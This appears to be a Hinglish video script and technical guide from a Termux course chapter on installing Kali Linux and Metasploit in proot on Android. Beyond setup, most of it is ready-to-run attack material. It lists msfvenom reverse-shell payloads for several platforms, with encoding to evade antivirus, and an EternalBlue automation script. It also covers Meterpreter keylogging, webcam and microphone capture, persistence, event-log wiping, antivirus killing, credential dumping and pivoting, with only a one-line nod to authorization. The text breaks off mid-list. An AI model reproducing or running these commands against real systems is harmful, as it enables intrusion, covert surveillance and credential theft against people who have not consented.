# Chapter 50: Metasploit in Proot (Full Setup)

> **Module:** 8 - Advanced  
> **Chapter:** 50 of 61  
> **Duration:** 25-30 Minutes  
> **Difficulty:** ⭐⭐⭐⭐ Advanced  

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | Full Kali Linux & Metasploit setup in proot |
| Advanced Topics | Armitage, custom modules, pivoting, automation |
| Commands Reference | 30+ advanced Metasploit commands |
| Practice Exercises | Hands-on exploitation labs |
| Troubleshooting | Common proot & Metasploit issues |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 50
Title: Metasploit in Proot | Complete Kali Linux Setup | T3rmuxk1ng
Duration: 25-30 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 1:00]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course!

Main aapka host hoon T3rmuxk1ng, aur aaj ek bahut special chapter hai -
Chapter 50: Metasploit in Proot - Full Setup!

Aapne Chapter 35 mein Metasploit basics seekha tha. Lekin Termux mein 
directly Metasploit install karna tricky hai. Aaj hum Kali Linux ko 
proot mein install karenge, aur usme FULL Metasploit Framework setup 
karenge - with database, Armitage GUI, custom modules, aur advanced 
features!

Ye chapter advanced hai, isliye dhyan se follow karein. Chaliye shuru karte hain!

Play button dabaiye, like karein, subscribe karein - notification bell ke saath.

---

[SECTION 1: WHY PROOT FOR METASPLOIT - 1:00 to 3:00]
─────────────────────────────────────────────────────────────────────────────

To sabse pehle - Proot mein Metasploit kyun?

Problem ye hai ki Termux native environment mein:
❌ PostgreSQL database properly kaam nahi karta
❌ Ruby versions compatible nahi hote
❌ Native extensions compile nahi hote
❌ Memory constraints issues
❌ Some Metasploit features missing

Solution - PROOT DISTRO!

┌─────────────────────────────────────────────────────────────────────────┐
│                    TERMUX NATIVE vs PROOT DISTRO                         │
├─────────────────────┬─────────────────────┬─────────────────────────────┤
│ Feature             │ Termux Native       │ Proot (Kali/Ubuntu)         │
├─────────────────────┼─────────────────────┼─────────────────────────────┤
│ Database Support    │ ❌ Limited          │ ✅ Full PostgreSQL          │
│ Ruby Environment    │ ⚠️ Incomplete       │ ✅ Full Ruby                │
│ Native Extensions   │ ❌ Many fail        │ ✅ Compile properly         │
│ Metasploit Version  │ ⚠️ May be outdated  │ ✅ Latest stable            │
│ Armitage GUI        │ ❌ Not working      │ ✅ Works with VNC           │
│ All Modules         │ ❌ Some broken      │ ✅ All working              │
│ Memory Management   │ ⚠️ Android limits   │ ✅ Better handling          │
└─────────────────────┴─────────────────────┴─────────────────────────────┘

Proot ek chroot-like environment deta hai Android pe, jahan full Linux 
distributions run kar sakte ho - Kali Linux, Ubuntu, Debian, Arch - sab!

---

[SECTION 2: PREREQUISITES CHECK - 3:00 to 4:30]
─────────────────────────────────────────────────────────────────────────────

Installation se pehle kuch requirements check karein:

[PHONE REQUIREMENTS]
✓ Android 7.0+ (Recommended Android 9+)
✓ Minimum 3GB free storage (5GB+ recommended)
✓ Minimum 2GB RAM (4GB+ recommended)
✓ Stable internet connection
✓ Termux from F-Droid (not Play Store)

[CHECK STORAGE]
    df -h

Storage check karein - /data partition pe kam se kam 3GB free hona chahiye.

[CHECK RAM]
    free -h

RAM check karein - 2GB+ recommended hai.

[TERMUX SETUP]
    pkg update && pkg upgrade -y

Termux ko fully update karein.

---

[SECTION 3: INSTALLING KALI LINUX IN PROOT - 4:30 to 10:00]
─────────────────────────────────────────────────────────────────────────────

Ab main installation process start karte hain. Step by step follow karein.

[STEP 1: Install proot-distro]

Proot-distro package install karein:
    pkg install proot-distro git wget curl -y

Proot-distro ek tool hai jo Linux distributions ko easily install 
aur manage karne mein madad karta hai.

[STEP 2: List Available Distros]

Available distributions dekhein:
    proot-distro list

Output mein aapko bahut saare distros dikhenge:
- ubuntu
- debian
- kali
- arch
- fedora
- alpine
- and many more...

[STEP 3: Install Kali Linux]

Kali Linux install karein:
    proot-distro install kali

Ye process 5-10 minutes lag sakta hai depending on internet speed.
Kali Linux ka rootfs download hoga aur extract hoga.

[SCREEN: Download progress]

Wait karein jab tak installation complete na ho.

[STEP 4: Login to Kali Linux]

Kali mein login karein:
    proot-distro login kali

Aapka prompt change ho jaayega:
    ┌───[user@localhost]───[~]
    └───$

Congratulations! Aap ab Kali Linux mein ho! 🎉

[STEP 5: Update Kali]

Kali Linux ko update karein:
    sudo apt update && sudo apt upgrade -y

Default password: kali (agar pooche to)

[STEP 6: Install Essential Tools]

Basic tools install karein:
    sudo apt install -y git wget curl nano vim

---

[SECTION 4: METASPLOIT INSTALLATION IN KALI - 10:00 to 15:00]
─────────────────────────────────────────────────────────────────────────────

Ab Metasploit Framework install karte hain Kali mein.

[METHOD 1: Using Kali Repository (Easiest)]

Kali Linux mein Metasploit pre-configured available hai:

    sudo apt install -y metasploit-framework

Ye command Metasploit aur saari dependencies install kar degi.

Wait karein - ye 10-15 minutes lag sakta hai.

[METHOD 2: Manual Installation from Source]

Agar latest version chahiye:

    # Install dependencies
    sudo apt install -y build-essential libreadline-dev libssl-dev \
    libpq-dev libsqlite3-dev ruby-dev ruby-bundler postgresql \
    autoconf bison libgdbm-dev libgdbm-compat-dev libncurses5-dev \
    libffi-dev libyaml-dev

    # Clone Metasploit
    git clone https://github.com/rapid7/metasploit-framework.git
    cd metasploit-framework

    # Install Ruby gems
    bundle install

    # Create symlinks
    sudo ln -s $(pwd)/msfconsole /usr/local/bin/msfconsole
    sudo ln -s $(pwd)/msfvenom /usr/local/bin/msfvenom

[VERIFY INSTALLATION]

Metasploit version check karein:
    msfconsole --version

Output:
    Metasploit Framework Version: 6.x.x

Agar version output aaya - installation successful! 🎉

---

[SECTION 5: DATABASE SETUP FOR METASPLOIT - 15:00 to 18:00]
─────────────────────────────────────────────────────────────────────────────

Ab database setup karte hain. Database important hai for:
- Workspace management
- Host and service tracking
- Credential storage
- Loot organization
- Scan result imports

[STEP 1: Start PostgreSQL Service]

    sudo service postgresql start

Agar error aaye, pehle initialize karein:
    sudo pg_ctlcluster 14 main start

Ya:
    sudo /etc/init.d/postgresql start

[STEP 2: Initialize Metasploit Database]

    msfdb init

Ye command:
- Database user create karega
- Database create karega
- Tables setup karega
- Configuration file generate karega

[STEP 3: Verify Database Connection]

Msfconsole start karein:
    msfconsole

Database status check karein:
    msf6 > db_status

Output:
    [*] Connected to msf. Connection type: postgresql.

Agar "Connected" dikha raha hai - database working hai! ✅

[STEP 4: Create Workspace]

Workspace create karein:
    msf6 > workspace -a project1

Workspace switch karein:
    msf6 > workspace project1

Workspaces list karein:
    msf6 > workspace

---

[SECTION 6: MSFCONSOLE ADVANCED FEATURES - 18:00 to 22:00]
─────────────────────────────────────────────────────────────────────────────

Ab msfconsole ke advanced features explore karte hain.

[RESOURCE SCRIPTS]

Resource scripts se aap automation kar sakte ho:

Create a resource script:
    nano auto_exploit.rc

Content:
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.50
    set LPORT 4444
    exploit -j

Run resource script:
    msfconsole -r auto_exploit.rc

[MSFCONSOLE COMMANDS]

Database Commands:
    msf6 > db_import scan.xml       # Import Nmap scan
    msf6 > db_export -f xml out.xml # Export data
    msf6 > hosts                     # List hosts
    msf6 > services                  # List services
    msf6 > creds                     # List credentials
    msf6 > loot                      # List collected data
    msf6 > vulns                     # List vulnerabilities

Host Management:
    msf6 > hosts -R 192.168.1.0/24  # Add hosts to RHOSTS
    msf6 > hosts -S apache          # Search hosts
    msf6 > hosts -d 192.168.1.100   # Delete host

Services Management:
    msf6 > services -S ssh          # Search SSH services
    msf6 > services -p 445          # Filter by port

Credentials Management:
    msf6 > creds add user:admin pass:password123
    msf6 > creds -o output.txt      # Export credentials

[MULTI-HANDLER AUTOMATION]

Multiple handlers ek saath run karein:
    msf6 > handler -H 192.168.1.50 -P 4444 -p windows/meterpreter/reverse_tcp
    msf6 > handler -H 192.168.1.50 -P 4445 -p android/meterpreter/reverse_tcp

[SESSION MANAGEMENT]

Sessions list karein:
    msf6 > sessions -l

Session ke saath interact karein:
    msf6 > sessions -i 1

Session background mein bhejein:
    meterpreter > background

Session kill karein:
    msf6 > sessions -k 1

Sab sessions kill karein:
    msf6 > sessions -K

---

[SECTION 7: MSFVENOM COMPLETE GUIDE - 22:00 to 26:00]
─────────────────────────────────────────────────────────────────────────────

Msfvenom ek powerful payload generator hai. Iska complete usage seekhte hain.

[BASIC PAYLOAD GENERATION]

Windows Meterpreter:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

Linux Meterpreter:
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

Android Meterpreter:
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

macOS Meterpreter:
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell.macho

PHP Web Shell:
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

JSP Web Shell:
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

ASP Web Shell:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

[STAGELESS PAYLOADS]

Stageless payloads single file mein complete hote hain:
    msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o stageless.exe

Difference:
- Staged: Small initial stager, downloads rest
- Stageless: Complete payload in one file

[ENCODING FOR EVASION]

Single encoding:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

Multiple iterations:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o multi_encoded.exe

Multiple encoders:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe | msfvenom -p - -e x86/countdown -i 5 -f exe -o double_encoded.exe

[CUSTOM PAYLOAD OPTIONS]

Add custom strings:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -a x86 --platform windows -o payload.exe

List available options:
    msfvenom -p windows/meterpreter/reverse_tcp --list-options

[LIST COMMANDS]

    msfvenom --list payloads        # All payloads
    msfvenom --list encoders        # All encoders
    msfvenom --list formats         # All output formats
    msfvenom --list platforms       # All platforms
    msfvenom --list archs           # All architectures

---

[SECTION 8: ARMITAGE GUI WITH VNC - 26:00 to 30:00]
─────────────────────────────────────────────────────────────────────────────

Ab Armitage GUI setup karte hain - ye Metasploit ka graphical interface hai.

[STEP 1: Install VNC Server]

Kali mein VNC server install karein:
    sudo apt install -y tigervnc-standalone-server tigervnc-common

[STEP 2: Install Armitage]

    sudo apt install -y armitage

[STEP 3: Configure VNC]

VNC password set karein:
    vncpasswd

VNC server start karein:
    vncserver :1 -geometry 1280x720

[STEP 4: Access VNC]

Termux mein VNC viewer use karein ya PC se connect karein:
    localhost:5901

Ya use VNC viewer app on another device.

[STEP 5: Start Armitage]

VNC desktop mein terminal open karein:
    armitage

Armitage GUI launch hoga!

[ARMITAGE FEATURES]

✓ Visual network representation
✓ Point-and-click exploitation
✓ Session management
✓ Post-exploitation modules
✓ Cortana scripting
✓ Team collaboration

[ARMITAGE WORKFLOW]

1. Hosts add karein (Nmap scan ya manual)
2. Services scan karein
3. Vulnerabilities identify karein
4. Exploits launch karein (right-click)
5. Sessions manage karein

---

[SECTION 9: CREATING CUSTOM MODULES - 30:00 to 34:00]
─────────────────────────────────────────────────────────────────────────────

Ab custom Metasploit modules create karna seekhte hain.

[MODULE STRUCTURE]

Metasploit modules Ruby mein likhe jaate hain:

    ~/metasploit-framework/modules/exploits/custom/my_exploit.rb

Ya installed Metasploit mein:
    /usr/share/metasploit-framework/modules/exploits/custom/

[BASIC EXPLOIT TEMPLATE]

    nano /usr/share/metasploit-framework/modules/exploits/custom/simple_exploit.rb

Content:
```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Simple Custom Exploit',
      'Description'    => 'A basic exploit template',
      'Author'         => ['YourName'],
      'References'     => [
        ['CVE', '2024-XXXXX']
      ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        => [
        ['Linux x86', { 'Ret' => 0xdeadbeef }]
      ],
      'Payload'        => {
        'Space' => 500,
        'BadChars' => "\x00\x0a\x0d"
      },
      'DisclosureDate' => '2024-01-01'
    ))

    register_options([
      Opt::RPORT(9999)
    ])
  end

  def exploit
    connect
    print_status("Sending exploit...")
    sock.put(payload.encoded)
    handler
    disconnect
  end
end
```

[RELOAD CUSTOM MODULES]

Msfconsole mein modules reload karein:
    msf6 > reload_all

Use custom module:
    msf6 > use exploit/custom/simple_exploit

[AUXILIARY MODULE TEMPLATE]

```ruby
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Scanner',
      'Description'    => 'A simple port scanner',
      'Author'         => ['YourName'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80)
    ])
  end

  def run
    connect
    print_status("Port #{rport} is open")
    disconnect
  end
end
```

---

[SECTION 10: METERPRETER SESSIONS DEEP DIVE - 34:00 to 38:00]
─────────────────────────────────────────────────────────────────────────────

Meterpreter ka advanced usage seekhte hain.

[SYSTEM INFORMATION]

    meterpreter > sysinfo              # System details
    meterpreter > getuid               # Current user
    meterpreter > getpid               # Process ID
    meterpreter > ps                   # All processes
    meterpreter > getprivs             # List privileges

[FILE SYSTEM OPERATIONS]

    meterpreter > pwd                  # Current directory
    meterpreter > ls                   # List files
    meterpreter > cd C:\\Users         # Change directory
    meterpreter > cat file.txt         # Read file
    meterpreter > edit file.txt        # Edit file
    meterpreter > upload local.txt remote.txt   # Upload
    meterpreter > download remote.txt local.txt # Download
    meterpreter > mkdir newfolder      # Create directory
    meterpreter > rm file.txt          # Delete file
    meterpreter > rmdir folder         # Delete directory
    meterpreter > timestomp file.txt   # Modify timestamps

[NETWORK OPERATIONS]

    meterpreter > ipconfig             # Network interfaces
    meterpreter > netstat              # Network connections
    meterpreter > route                # Routing table
    meterpreter > arp                  # ARP cache
    meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forward

[PROCESS MANAGEMENT]

    meterpreter > ps                   # List processes
    meterpreter > migrate PID          # Migrate to process
    meterpreter > execute -f cmd.exe -i -H   # Execute command
    meterpreter > kill PID             # Kill process
    meterpreter > getpid               # Current process

[PRIVILEGE ESCALATION]

    meterpreter > getsystem            # Get SYSTEM privileges
    meterpreter > getprivs             # Get all privileges
    meterpreter > run post/multi/recon/local_exploit_suggester  # Suggest exploits

[KEYLOGGING & SCREENSHOTS]

    meterpreter > keyscan_start        # Start keylogger
    meterpreter > keyscan_dump         # Dump keystrokes
    meterpreter > keyscan_stop         # Stop keylogger
    meterpreter > screenshot           # Take screenshot
    meterpreter > screenshare          # Live screen sharing

[WEBCAM & AUDIO]

    meterpreter > webcam_list          # List webcams
    meterpreter > webcam_snap          # Take photo
    meterpreter > webcam_stream        # Live stream
    meterpreter > record_mic           # Record audio

[PERSISTENCE]

    meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

[CLEANUP]

    meterpreter > clearev              # Clear event logs
    meterpreter > timestomp            # Modify file times

---

[SECTION 11: PIVOTING AND ROUTING - 38:00 to 42:00]
─────────────────────────────────────────────────────────────────────────────

Pivoting ek advanced technique hai jisse aap compromised machine ke through 
internal networks access kar sakte ho.

[AUTOROUTE]

Meterpreter session ke through automatic routing:

    meterpreter > run post/multi/manage/autoroute

Ya msfconsole se:
    msf6 > use post/multi/manage/autoroute
    msf6 post(...) > set SESSION 1
    msf6 post(...) > run

[MANUAL ROUTING]

    meterpreter > run autoroute -s 10.0.0.0/24
    meterpreter > run autoroute -p        # Print routes

[PORT FORWARDING]

Local port forward:
    meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.50

Ab aap localhost:3389 se 10.0.0.50:3389 connect kar sakte ho.

Reverse port forward:
    meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

[SOCKS PROXY]

SOCKS proxy setup karein:
    msf6 > use auxiliary/server/socks_proxy
    msf6 auxiliary(...) > set SRVPORT 1080
    msf6 auxiliary(...) > set VERSION 4a
    msf6 auxiliary(...) > run

Proxy chains configure karein:
    sudo nano /etc/proxychains4.conf
    
Add:
    socks4 127.0.0.1 1080

Ab kisi bhi tool ko proxy ke through run karein:
    proxychains nmap -sT 10.0.0.0/24

[SCANNING THROUGH PIVOT]

    msf6 > use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(...) > set RHOSTS 10.0.0.0/24
    msf6 auxiliary(...) > set PORTS 445,3389,22
    msf6 auxiliary(...) > run

---

[SECTION 12: POST-EXPLOITATION MODULES - 42:00 to 45:00]
─────────────────────────────────────────────────────────────────────────────

Post-exploitation modules ka complete overview.

[INFORMATION GATHERING]

Windows:
    run post/windows/gather/enum_system
    run post/windows/gather/enum_applications
    run post/windows/gather/enum_network
    run post/windows/gather/enum_shares
    run post/windows/gather/enum_logged_on_users
    run post/windows/gather/enum_services

Linux:
    run post/linux/gather/enum_system
    run post/linux/gather/checkcontainer
    run post/linux/gather/enum_network

[CREDENTIAL HARVESTING]

    run post/windows/gather/smart_hashdump
    run post/windows/gather/credentials/gpp
    run post/windows/gather/enum_chrome
    run post/windows/gather/credentials/skype
    run post/windows/gather/credentials/filezilla_server
    run post/windows/gather/credentials/mremote
    run post/windows/gather/credentials/vnc

[PRIVILEGE ESCALATION]

    run post/multi/recon/local_exploit_suggester
    run post/windows/escalate/droplink
    run post/windows/escalate/ask

[PERSISTENCE]

    run post/windows/manage/persistence
    run persistence -U -i 10 -p 4444 -r 192.168.1.50

[CLEANUP]

    run post/windows/manage/delete_user USERNAME=testuser
    run post/windows/manage/killav

---

[SECTION 13: RESOURCE SCRIPTS & AUTOMATION - 45:00 to 48:00]
─────────────────────────────────────────────────────────────────────────────

Automation ke liye resource scripts use karein.

[CREATE RESOURCE SCRIPT]

    nano exploit_script.rc

Content:
```
# Setup workspace
workspace -a assessment
setg LHOST 192.168.1.50
setg LPORT 4444

# Import scan results
db_import /path/to/nmap_scan.xml

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:hosts.txt
set payload windows/meterpreter/reverse_tcp
check
exploit -j

# Setup handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
exploit -j
```

[RUN RESOURCE SCRIPT]

    msfconsole -r exploit_script.rc

[MSFCONSOLE AUTOMATION]

Auto-run script:
    msfconsole -q -x "db_connect; workspace -a test; use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; exploit -j"

[POST-AUTOMATION]

    meterpreter > run multi_console_command -r /path/to/commands.txt

[COMMON RESOURCE SCRIPTS]

Built-in scripts location:
    /usr/share/metasploit-framework/scripts/resource/

Useful scripts:
- auto_pass_hash.rc - Pass the hash automation
- file_hosting.rc - Host files for download
- multi_gather.rc - Multiple gather modules

---

[SECTION 14: INTEGRATION WITH OTHER TOOLS - 48:00 to 51:00]
─────────────────────────────────────────────────────────────────────────────

Metasploit ko other tools ke saath integrate karna.

[NMAP INTEGRATION]

Nmap scan import:
    msf6 > db_import nmap_scan.xml

Nmap scan from msfconsole:
    msf6 > nmap -sV -sC 192.168.1.0/24 -oX scan.xml
    msf6 > db_import scan.xml

[NEXPOSE/NESSUS INTEGRATION]

Import Nessus scan:
    msf6 > db_import nessus_scan.nessus

[JOHN THE RIPPER]

Hash dump and crack:
    meterpreter > hashdump
    # Save hashes to file
    john --format=NT hashes.txt

[HYDRA INTEGRATION]

Use credentials from database:
    msf6 > creds

Use with hydra:
    hydra -l admin -P /path/to/wordlist.txt ssh://target

[SEARCHSPLOIT]

Find exploits:
    searchsploit apache 2.4

Copy exploit:
    searchsploit -m 12345

[METASPLOIT + NCMAP]

Automated scanning:
```bash
nmap -sV -sC --script vuln target -oX scan.xml
msfconsole -q -x "db_import scan.xml; vulns"
```

---

[SECTION 15: LOGGING AND REPORTING - 51:00 to 54:00]
─────────────────────────────────────────────────────────────────────────────

Proper logging and reporting setup.

[ENABLE LOGGING]

Command logging:
    msf6 > set ConsoleLogging true
    msf6 > set LogLevel 5

Log file location:
    ~/.msf4/logs/

[SESSION LOGGING]

    meterpreter > load_fileterext

[DATABASE EXPORT]

Export all data:
    msf6 > db_export -f xml /path/to/backup.xml

Export specific:
    msf6 > hosts -o hosts.csv
    msf6 > services -o services.csv
    msf6 > creds -o creds.csv
    msf6 > loot -o loot.csv

[REPORT GENERATION]

Metasploit Pro version has reporting, but we can generate manually:

Create report script:
```ruby
# report.rb
File.open("report.txt", "w") do |f|
  f.puts "=== Metasploit Report ==="
  f.puts "Date: #{Time.now}"
  framework.db.hosts.each do |host|
    f.puts "Host: #{host.address}"
    host.services.each do |service|
      f.puts "  Port: #{service.port}/#{service.proto}"
    end
  end
end
```

Run:
    msf6 > irb
    >> load "report.rb"

[ACTIVITY LOGS]

    msf6 > show logs
    msf6 > show logpath

---

[SECTION 16: SUMMARY & BEST PRACTICES - 54:00 to 56:00]
─────────────────────────────────────────────────────────────────────────────

CHAPTER SUMMARY:

Aaj humne seekha:
✅ Kali Linux installation in proot
✅ Full Metasploit Framework setup
✅ PostgreSQL database configuration
✅ Msfconsole advanced features
✅ Msfvenom complete payload generation
✅ Armitage GUI with VNC
✅ Custom module creation
✅ Meterpreter deep dive
✅ Pivoting and routing
✅ Post-exploitation modules
✅ Resource scripts & automation
✅ Integration with other tools
✅ Logging and reporting

BEST PRACTICES:

✓ Always use authorized systems only
✓ Keep Metasploit updated
✓ Use workspaces for organization
✓ Document everything
✓ Test exploits before running
✓ Use proper encoding for payloads
✓ Clean up after testing
✓ Save and export results regularly
✓ Use resource scripts for repeated tasks
✓ Understand what each module does

---

[OUTRO - 56:00 to 57:00]
─────────────────────────────────────────────────────────────────────────────

Dosto, Chapter 50 complete!

Metasploit Framework ek bahut powerful tool hai. Aaj humne complete setup 
seekha - Kali Linux se lekar advanced pivoting tak. 

Ab aap Termux mein professional penetration testing kar sakte ho!

Agar ye video helpful lagi:
👍 Like button press karein
🔔 Subscribe karein, notification bell on karein
💬 Koi sawal ho to comment mein poochein
📤 Share karein friends ke saath

Next chapter mein hum aur advanced topics cover karenge.

Thank you for watching! See you in next chapter!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. Proot-Distro Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         PROOT ARCHITECTURE                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                      Android Application                         │   │
│   │                   (Termux Terminal App)                         │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                     Termux Native Layer                          │   │
│   │              (pkg, $PREFIX, native binaries)                     │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                         PROOT Layer                              │   │
│   │         (User-space implementation of chroot)                   │   │
│   │                                                                  │   │
│   │   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │   │
│   │   │    Kali     │  │   Ubuntu    │  │   Debian    │             │   │
│   │   │   Linux     │  │             │  │             │             │   │
│   │   │             │  │             │  │             │             │   │
│   │   │ Metasploit  │  │   Tools     │  │   Tools     │             │   │
│   │   │ Framework   │  │             │  │             │             │   │
│   │   └─────────────┘  └─────────────┘  └─────────────┘             │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│                                   ▼                                      │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                    Android Linux Kernel                          │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. Complete Installation Guide

#### Step 1: Termux Preparation

```bash
# Update Termux
pkg update && pkg upgrade -y

# Install required packages
pkg install proot-distro git wget curl nano -y

# Grant storage permission
termux-setup-storage
```

#### Step 2: Kali Linux Installation

```bash
# Install Kali Linux
proot-distro install kali

# Login to Kali
proot-distro login kali

# Or login with shared storage
proot-distro login kali --shared-tmp
```

#### Step 3: Kali System Setup

```bash
# Update Kali
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install -y git wget curl nano vim build-essential
```

#### Step 4: Metasploit Installation

```bash
# Method 1: From Kali Repository (Recommended)
sudo apt install -y metasploit-framework

# Method 2: From Source
sudo apt install -y ruby ruby-dev build-essential libreadline-dev \
libssl-dev libpq-dev libsqlite3-dev libpcap-dev

git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install
sudo ln -s $(pwd)/msfconsole /usr/local/bin/
```

#### Step 5: Database Setup

```bash
# Start PostgreSQL
sudo service postgresql start

# Initialize Metasploit database
msfdb init

# Verify
msfconsole -q -x "db_status; exit"
```

#### Step 6: Environment Configuration

```bash
# Add to ~/.bashrc for persistence
echo 'export MSF_DATABASE_CONFIG=~/.msf4/database.yml' >> ~/.bashrc
echo 'alias msf="msfconsole -q"' >> ~/.bashrc
source ~/.bashrc
```

### 3. Metasploit Directory Structure

```
/usr/share/metasploit-framework/
├── app/                    # Application code
├── data/                   # Data files
│   ├── exploits/          # Exploit data
│   ├── payloads/          # Payload templates
│   ├── wordlists/         # Wordlists
│   └── templates/         # Module templates
├── lib/                    # Libraries
├── modules/                # Module directory
│   ├── auxiliary/         # Auxiliary modules
│   ├── encoders/          # Encoders
│   ├── evasion/           # Evasion modules
│   ├── exploits/          # Exploit modules
│   ├── nops/              # NOP modules
│   ├── payloads/          # Payload modules
│   └── post/              # Post-exploitation modules
├── plugins/               # Plugins
├── scripts/               # Resource scripts
│   └── resource/          # Built-in resource scripts
└── tools/                 # Utility tools

~/.msf4/                   # User configuration
├── config/               # Configuration files
├── logs/                 # Log files
├── loot/                 # Collected data
├── modules/              # Custom modules
└── scripts/              # Custom scripts
```

### 4. Advanced Msfconsole Commands

```bash
# Console Management
banner                          # Show banner
version                         # Show version
help                            # Show help
history                         # Command history
save                            # Save current settings

# Module Operations
show all                        # Show all modules
show exploits                   # Show exploits
show payloads                   # Show payloads
show auxiliary                  # Show auxiliary
show encoders                   # Show encoders
show post                       # Show post modules
show nops                       # Show NOP modules
show evasion                    # Show evasion modules

# Search Commands
search <keyword>                # Basic search
search type:exploit <keyword>   # Search by type
search platform:windows         # Search by platform
search cve:2024                 # Search by CVE
search app:apache               # Search by application
search author:hdm               # Search by author
search rank:excellent           # Search by rank

# Database Commands
db_status                       # Check database connection
db_connect                      # Connect to database
db_disconnect                   # Disconnect database
db_import <file>               # Import scan results
db_export -f xml <file>        # Export database
hosts                           # List hosts
services                        # List services
creds                          # List credentials
loot                           # List collected data
vulns                          # List vulnerabilities
notes                          # List notes
workspace                       # List workspaces
workspace -a <name>            # Add workspace
workspace <name>               # Switch workspace
workspace -d <name>            # Delete workspace

# Session Commands
sessions -l                     # List sessions
sessions -i <id>               # Interact with session
sessions -k <id>               # Kill session
sessions -K                    # Kill all sessions
sessions -v                    # Verbose session list

# Exploit Commands
use <module>                    # Select module
info                            # Module information
show options                    # Show options
show advanced                   # Show advanced options
show evasion                    # Show evasion options
show targets                    # Show targets
set <option> <value>           # Set option
setg <option> <value>          # Set global option
unset <option>                 # Unset option
unsetg <option>                # Unset global option
check                           # Check if vulnerable
exploit                         # Run exploit
run                             # Alias for exploit
exploit -j                      # Run as job
exploit -z                      # Background on success
reload                          # Reload module
back                            # Exit module

# Handler Commands
handler -H <ip> -P <port> -p <payload>   # Quick handler setup
jobs                            # List jobs
jobs -k <id>                   # Kill job

# Resource Scripts
resource <file>                 # Run resource script
makerc <file>                  # Save commands to file
```

### 5. Advanced Msfvenom Commands

```bash
# Basic Payload Generation
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>

# List Options
msfvenom --list payloads       # List all payloads
msfvenom --list encoders       # List all encoders
msfvenom --list formats        # List all formats
msfvenom --list platforms      # List all platforms
msfvenom --list archs          # List all architectures
msfvenom -p <payload> --list-options  # Payload options

# Windows Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o stageless.exe
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o cmd.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell64.exe

# Linux Payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell64.elf

# Android Payloads
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o shell.apk

# macOS Payloads
